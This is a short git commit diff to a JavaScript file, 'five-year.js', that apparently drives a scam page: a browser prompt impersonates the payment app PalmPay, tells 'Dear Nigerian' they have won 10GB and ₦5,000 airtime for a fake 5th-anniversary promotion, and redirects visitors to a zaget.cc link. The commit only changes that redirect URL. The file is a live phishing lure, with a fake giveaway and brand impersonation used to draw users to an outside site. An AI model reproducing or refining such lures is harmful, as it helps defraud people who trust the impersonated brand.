7055fa7083da08f624f32b6f99ad274053df7507
surprise24x7 <132287490+surprise24x7@users.noreply.github.com>
2024-09-21 18:17:05 +0530

    Update five-year.js

--- five-year.js
+++ five-year.js
@@ -2,5 +2,5 @@
 var password = '10GB + ₦5,000 Airtime'
 password=prompt('PalmPay: Dear Nigerian, you have been selected to receive 10GB + ₦5,000 Airtime Voucher in celebration of PalmPay 5th Anniversary, press Ok to get offer now ','10GB + ₦5,000 Airtime');
 if (password != '10GB + ₦5,000 Airtime') {
-location.href='https://zaget.cc/5yrs-anniversary';
+location.href='https://zaget.cc/5yrs-anniversary.html';
 }
